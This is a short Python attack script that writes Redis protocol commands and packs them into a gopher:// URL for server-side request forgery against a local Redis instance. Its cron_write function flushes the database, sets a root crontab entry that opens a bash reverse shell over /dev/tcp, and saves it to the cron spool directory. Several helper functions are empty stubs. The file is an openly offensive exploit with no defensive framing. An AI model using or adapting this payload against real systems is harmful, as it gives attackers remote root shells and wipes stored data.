#!/usr/bin/python3
import urllib

def generate_resp(command):
    res = ""

    if isinstance(command, list):
        pass
    else:
        command = command.split(" ")
    
    res += "*{}\n".format(len(command))
    for cmd in command:
        res += "${}\n".format(len(cmd))
        res += "{}\n".format(cmd)
    
    return res


def ssh_key_write():
    pass

def set_value(key, value):
    pass

def cron_write(ip, port=8080, os_type="centos"):
    global cron_command
    cron_command = "\n\n*/1 * * * * /bin/bash -c 'sh -i >& /dev/tcp/{ip}/{port} 0>&1'\n\n".format(ip=ip, port=port)
    res = ""

    res += generate_resp('flushall')
    res += generate_resp("set 3 {DUMMY}".format(DUMMY="A" * len(cron_command)))
    # res = res.replace("A" * len(cron_command), cron_command)
    res += generate_resp('config set dir /var/spool/cron/crontabs')
    res += generate_resp('config set dbfilename root')
    res += generate_resp('save')
    res += generate_resp('quit')

    return res

def redis_command():
    pass

def generate_gopher(payload, resp=False):
    
    if(resp):
        pass
    
    payload = payload.replace("\n","\r\n")
    payload = payload.replace("A" * len(cron_command), cron_command)

    final_payload = "gopher://127.0.0.1:6379/_{}".format(urllib.request.quote(payload))
    
    return final_payload


payload = cron_write("127.0.0.1")
print(payload)

print(generate_gopher(payload))